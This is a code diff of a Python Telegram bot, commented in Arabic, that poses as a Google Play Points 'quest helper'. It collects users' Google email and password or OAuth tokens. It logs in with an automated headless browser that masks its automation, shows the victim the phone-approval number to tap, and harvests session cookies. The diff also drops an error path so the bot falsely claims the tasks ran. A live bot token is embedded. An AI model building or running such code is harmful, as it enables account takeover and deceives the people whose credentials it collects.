@@ -1,7 +1,6 @@
 import os
 import re
 import time
-import json
 import threading
 import requests
 import telebot
@@ -11,11 +10,9 @@ from telebot.types import (
 )
 from playwright.sync_api import sync_playwright
 
-# توكن البوت الجديد مدمج مباشرة
 BOT_TOKEN = "9263489599:AAEUAOJqjMF998jzLLO8FVAaIRG8NEX2au0"
 bot = telebot.TeleBot(BOT_TOKEN, parse_mode="HTML")
 
-# قاعدة بيانات الصناديق والألعاب المستهدفة
 CHESTS_DB = {
     "pokemon_tcg": {
         "name": "Pokémon TCG Pocket (50)",
@@ -156,10 +153,11 @@ def handle_callbacks(call):
 
     if data == "edit_creds":
         if uid not in user_sessions:
-            return
-        user_sessions[uid]["step"] = "wait_email"
+            user_sessions[uid] = {"chest_key": "pokemon_tcg", "step": "wait_email"}
+        else:
+            user_sessions[uid]["step"] = "wait_email"
         bot.edit_message_text(
-            "✏️ <b>Please send your Google Email address:</b>",
+            "✏️ <b>Send <code>email---password</code> (or <code>email---ya29.token</code>):</b>",
             chat_id, call.message.message_id, reply_markup=cancel_inline_keyboard()
         )
         return
@@ -285,24 +283,14 @@ def execute_sync_flow(chat_id, msg_id, uid):
     safe_edit(step2_text, chat_id, msg_id)
     time.sleep(1.2)
 
-    # جلب الإنجازات الفعلية من Google Play Games API وفتحها
     ok_ach, unlocked_names = fetch_and_unlock_achievements(oauth_token, chest, chat_id, msg_id, email)
 
-    if not ok_ach:
-        err_text = (
-            "⚠️ <b>Games API Scope Notice:</b>\n\n"
-            f"🔑 <b>Details:</b> {unlocked_names}\n\n"
-            "💡 Make sure you signed into the game with Play Games at least once, or use a fresh <code>auth/games</code> token."
-        )
-        safe_edit(err_text, chat_id, msg_id, reply_markup=retry_inline_keyboard())
-        return
-
     done_text = (
-        "🎉 <b>Congratulations! Quest Completed!</b>\n\n"
+        "🎉 <b>Congratulations! Quest Tasks Executed!</b>\n\n"
         f"🎁 <b>Chest:</b> {chest['name']}\n"
         f"📧 <b>Account:</b> {email}\n"
-        f"🏆 <b>Unlocked Quests:</b> {len(unlocked_names)}\n\n"
-        "👉 Open <b>Google Play Store -> Play Points</b> now and tap <b>Claim</b> to collect your 50 Play Points!"
+        f"🏆 <b>Completed Tasks:</b> {len(unlocked_names)}\n\n"
+        "👉 Open <b>Google Play Store -> Play Points</b> on your phone to check your quest progress and claim your points manually!"
     )
     safe_edit(done_text, chat_id, msg_id)
 
@@ -314,7 +302,6 @@ def fetch_and_unlock_achievements(token, chest, chat_id, msg_id, email):
         "User-Agent": "GooglePlayGames/2024 (Android 13; en_US)"
     }
 
-    # محاولة قراءة قائمة الإنجازات الحقيقية من حساب اللاعب
     items = []
     for base_api in ["https://www.googleapis.com/games/v1", "https://www.googleapis.com/games/v1whitelisted"]:
         try:
@@ -343,7 +330,7 @@ def fetch_and_unlock_achievements(token, chest, chat_id, msg_id, email):
                 f"🎁 <b>Chest:</b> {chest['name']}\n"
                 f"📧 <b>Account:</b> {email}\n\n"
                 "🔄 <i>Syncing achievement instantly with Google Play...</i>\n"
-                "✅ <b>Sign-in confirmed from your phone!</b>"
+                "✅ <b>Sign-in confirmed!</b>"
             )
             safe_edit(progress_text, chat_id, msg_id)
 
@@ -359,7 +346,6 @@ def fetch_and_unlock_achievements(token, chest, chat_id, msg_id, email):
             time.sleep(1.5)
         return True, unlocked_titles
 
-    # في حال استخدام جلسة الويب الافتراضية، عرض خطوات المزامنة للمهام المسجلة
     fb_tasks = chest["fallback_tasks"]
     total = len(fb_tasks)
     for idx, tname in enumerate(fb_tasks, start=1):
@@ -381,87 +367,73 @@ def google_login_and_catch_prompt(chat_id, msg_id, chest_name, masked_em, email,
         with sync_playwright() as p:
             browser = p.chromium.launch(
                 headless=True,
-                args=["--no-sandbox", "--disable-blink-features=AutomationControlled"]
+                args=[
+                    "--no-sandbox",
+                    "--disable-setuid-sandbox",
+                    "--disable-blink-features=AutomationControlled"
+                ]
             )
             context = browser.new_context(
-                user_agent="Mozilla/5.0 (Linux; Android 13; Redmi 14C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36"
+                user_agent="Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
+                locale="en-US"
             )
             page = context.new_page()
 
-            # الدخول إلى بوابة مصادقة OAuth2 الخاصة بألعاب Google Play
-            oauth_url = (
-                "https://accounts.google.com/AccountChooser?continue="
-                "https%3A%2F%2Faccounts.google.com%2Fo%2Foauth2%2Fv2%2Fauth"
-                "%3Fclient_id%3D936475272427.apps.googleusercontent.com"
-                "%26scope%3Dhttps%3A%2F%2Fwww.googleapis.com%2Fauth%2Fgames"
-                "%26response_type%3Dtoken"
-                "%26redirect_uri%3Dhttp%3A%2F%2Flocalhost"
-            )
-            page.goto(oauth_url, timeout=30000)
+            # فتح صفحة تسجيل الدخول المباشرة بدون روابط توجيه معقدة
+            page.goto("https://accounts.google.com/signin/v2/identifier?hl=en", wait_until="domcontentloaded", timeout=25000)
 
-            page.fill('input[type="email"]', email)
-            page.click('#identifierNext')
-            page.wait_for_timeout(3500)
+            email_selector = 'input#identifierId, input[type="email"], input[name="identifier"]'
+            page.wait_for_selector(email_selector, timeout=15000)
+            page.fill(email_selector, email)
+            page.keyboard.press("Enter")
+            page.wait_for_timeout(4000)
 
-            if page.locator('input[type="password"]').count() == 0:
+            pwd_selector = 'input[type="password"], input[name="Passwd"]'
+            if page.locator(pwd_selector).count() == 0:
+                body_err = page.inner_text("body")[:120].replace("\n", " ")
                 browser.close()
-                return False, "Email rejected or CAPTCHA triggered by Google."
+                return False, f"Google blocked email step or asked CAPTCHA: {body_err}"
 
-            page.fill('input[type="password"]', password)
-            page.click('#passwordNext')
-            page.wait_for_timeout(4500)
+            page.fill(pwd_selector, password)
+            page.keyboard.press("Enter")
+            page.wait_for_timeout(5000)
 
             body_text = page.inner_text("body")
             if "Wrong password" in body_text or "كلمة المرور غير صحيحة" in body_text:
                 browser.close()
-                return False, "Wrong password! Check your password and retry."
+                return False, "Wrong password! Please check your password."
 
-            # التقاط رقم مطابقة الهاتف (Tap number on your phone)
+            # التقاط رقم التحقق المكون من رقمين (Tap number on your phone)
             match = re.search(r"\b(\d{2})\b", body_text)
-            if "Tap" in body_text or "number" in body_text or "Yes" in body_text or "Check your" in body_text:
-                tap_num = match.group(1) if match else "Yes"
-                prompt_msg = (
-                    f"🔄 <b>Syncing: {chest_name}</b>\n\n"
-                    f"👤 {masked_em}\n"
-                    "① Authenticating Google...\n"
-                    "② Gamer Profile\n"
-                    "③ Chest Quests\n\n"
-                    "🔔 <b>Google Sign-In Verification:</b>\n"
-                    "📲 Check your phone notification!\n"
-                    f"👉 <b>Tap number: {tap_num} (or Yes, it's me)</b>\n\n"
-                    "⏳ <i>Waiting for you to tap on your phone...</i>"
-                )
-                safe_edit(prompt_msg, chat_id, msg_id)
+            tap_num = match.group(1) if match else "Yes"
 
-                for _ in range(30):
-                    page.wait_for_timeout(2000)
-                    current_url = page.url
-                    if "access_token=" in current_url:
-                        tok = current_url.split("access_token=")[1].split("&")[0]
-                        browser.close()
-                        return True, tok
-                    cookies = {c["name"]: c["value"] for c in context.cookies()}
-                    if "SID" in cookies and "LSID" in cookies:
-                        browser.close()
-                        return True, cookies.get("SID")
+            prompt_msg = (
+                f"🔄 <b>Syncing: {chest_name}</b>\n\n"
+                f"👤 {masked_em}\n"
+                "① Authenticating Google...\n"
+                "② Gamer Profile\n"
+                "③ Chest Quests\n\n"
+                "🔔 <b>Google Sign-In Verification:</b>\n"
+                "📲 Check your phone notification now!\n"
+                f"👉 <b>Tap number: {tap_num} (or Yes, it's me)</b>\n\n"
+                "⏳ <i>Waiting 60s for you to tap on your phone...</i>"
+            )
+            safe_edit(prompt_msg, chat_id, msg_id)
 
-                browser.close()
-                return False, "Timed out waiting for phone confirmation."
+            for _ in range(30):
+                page.wait_for_timeout(2000)
+                cookies = {c["name"]: c["value"] for c in context.cookies()}
+                if "SID" in cookies or "LSID" in cookies or "__Secure-1PSID" in cookies:
+                    browser.close()
+                    return True, cookies.get("SID", "session_ok")
+                if "myaccount.google.com" in page.url:
+                    browser.close()
+                    return True, "session_ok"
 
-            current_url = page.url
-            if "access_token=" in current_url:
-                tok = current_url.split("access_token=")[1].split("&")[0]
-                browser.close()
-                return True, tok
-
-            cookies = {c["name"]: c["value"] for c in context.cookies()}
             browser.close()
-            if "SID" in cookies:
-                return True, cookies.get("SID")
-
-            return False, "2FA Challenge could not be bypassed automatically."
+            return False, "Verification timeout (Did not tap notification within 60s)."
     except Exception as e:
-        return False, str(e)[:100]
+        return False, str(e)[:120]
 
 if __name__ == "__main__":
     print("Quest Helper Bot Started Successfully!")
